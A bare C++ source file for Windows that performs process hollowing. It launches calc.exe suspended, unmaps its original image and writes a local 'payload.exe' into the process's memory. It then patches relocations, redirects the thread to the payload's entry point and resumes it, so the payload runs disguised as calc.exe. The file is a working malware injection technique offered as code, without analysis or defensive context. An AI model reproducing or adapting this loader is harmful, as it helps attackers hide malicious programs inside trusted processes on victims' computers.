#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

char local_file[] = "C:\\Users\\test\\Desktop\\payload.exe";

typedef NTSTATUS(*_NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef struct _BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct _BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;

}BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main()
{
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
    HANDLE h_remote_process;
    DWORD return_length = 0;
    DWORD64 base;
    LPVOID image_base = NULL, local_file_buffer = NULL, new_image_base = NULL;
    SIZE_T bytes_read = 0;
    HANDLE h_local_file;
    DWORD file_size, image_size;
    DWORD64 addr_ZwUnmapViewOfSection, delta;
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS nt_header;

    addr_ZwUnmapViewOfSection = (DWORD64)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwUnmapViewOfSection");
    _NtUnmapViewOfSection func__NtUnmapViewOfSection = (_NtUnmapViewOfSection)addr_ZwUnmapViewOfSection;

    if (!CreateProcessA(NULL, (CHAR*)"calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi)) {
        printf("could not create calc.exe. error: %x\n", GetLastError());
        exit(-1);
    }
    else {
        printf("Success\n");
    }
    h_remote_process = pi->hProcess;

    if (NtQueryInformationProcess(h_remote_process, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &return_length) != ERROR_SUCCESS) {
        printf("could not get process information\n");
        exit(-2);
    }

    printf("return_length: %x\n", return_length);

    base = (DWORD64)pbi->PebBaseAddress + 0x10;
    
    ReadProcessMemory(h_remote_process, (LPVOID)base, &image_base, 8, &bytes_read);
    printf("image_base: %I64x\n", image_base);

    // open local file read it's headers

    h_local_file = CreateFileA(local_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_local_file == INVALID_HANDLE_VALUE) {
        printf("could not open file handle. error: %x\n", GetLastError());
        exit(-1);
    }

    file_size = GetFileSize(h_local_file, NULL);

    printf("file_size: %x\n", file_size);

    local_file_buffer = (LPVOID)malloc(sizeof(LPVOID) * file_size);

    if (!ReadFile(h_local_file, local_file_buffer, file_size, NULL, NULL)) {
        printf("file read failure. error: %x\n", GetLastError());
        exit(-1);
    }

    dos_header = (PIMAGE_DOS_HEADER)local_file_buffer;
    nt_header = (PIMAGE_NT_HEADERS)(dos_header->e_lfanew + (unsigned char*)local_file_buffer);
    
    printf("e_lfanew: %x\n", dos_header->e_lfanew);
    printf("signature: %x\n", nt_header->Signature);

    image_size = nt_header->OptionalHeader.SizeOfImage;

    printf("image_size: %x\n", image_size);

    func__NtUnmapViewOfSection(h_remote_process, image_base);

    new_image_base = VirtualAllocEx(h_remote_process, image_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    printf("image_base: %I64x\tnew_image_base: %I64x\n", image_base, new_image_base);

    delta = (DWORD64)image_base - nt_header->OptionalHeader.ImageBase;
    nt_header->OptionalHeader.ImageBase = (DWORD64)image_base;

    WriteProcessMemory(h_remote_process, new_image_base, local_file_buffer, nt_header->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD64)local_file_buffer + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    PIMAGE_SECTION_HEADER section_bkp = section;

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        //printf("section name: %s\n", section->Name);
        LPVOID dest_section_loc = (LPVOID)((DWORD64)image_base + section->VirtualAddress);
        //printf("dest_sec_loc: %I64x\n", dest_section_loc);
        LPVOID src_section_loc = (LPVOID)((DWORD64)local_file_buffer + section->PointerToRawData);
        WriteProcessMemory(h_remote_process, dest_section_loc, src_section_loc, section->SizeOfRawData, NULL);
        section++;
    }

    IMAGE_DATA_DIRECTORY relocation_table = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    section = section_bkp;

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {

        if (strcmp((char*)section->Name, ".reloc") != 0) {
            section++;
            continue;
        }

        printf("found .reloc section");

        DWORD64 ptr_raw_data = section->PointerToRawData;
        DWORD64 reloc_offset = 0;

        while (reloc_offset < relocation_table.Size) {

            PBASE_RELOCATION_BLOCK base_relocation_block = (PBASE_RELOCATION_BLOCK)((DWORD64)local_file_buffer + ptr_raw_data + reloc_offset);
            reloc_offset += sizeof(BASE_RELOCATION_BLOCK);
            PBASE_RELOCATION_ENTRY base_relocation_entry = (PBASE_RELOCATION_ENTRY)((DWORD64)local_file_buffer + ptr_raw_data + reloc_offset);
            DWORD relocation_entry_count = (base_relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

            for (int j = 0; j < relocation_entry_count; j++) {
                reloc_offset += sizeof(BASE_RELOCATION_ENTRY);
                if (base_relocation_entry[j].Type == 0) {
                    continue;
                }

                DWORD64 patched_address = base_relocation_block->PageAddress + base_relocation_entry[j].Offset;
                DWORD64 patch_buffer = 0;

                ReadProcessMemory(h_remote_process, (LPVOID)((DWORD64)image_base + patched_address), &patch_buffer, sizeof(DWORD64), NULL);
                patch_buffer += delta;
                WriteProcessMemory(h_remote_process, (LPVOID)((DWORD64)image_base + patched_address), &patch_buffer, sizeof(DWORD64), NULL);
            }
        }
    }

    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi->hThread, context);
    DWORD64 entry_point = (DWORD64)image_base + nt_header->OptionalHeader.AddressOfEntryPoint;
    context->Rcx = entry_point;
    printf("entry_point: %I64x\n", entry_point);
    SetThreadContext(pi->hThread, context);
    ResumeThread(pi->hThread);
    printf("Success\n");

    return 0;
}
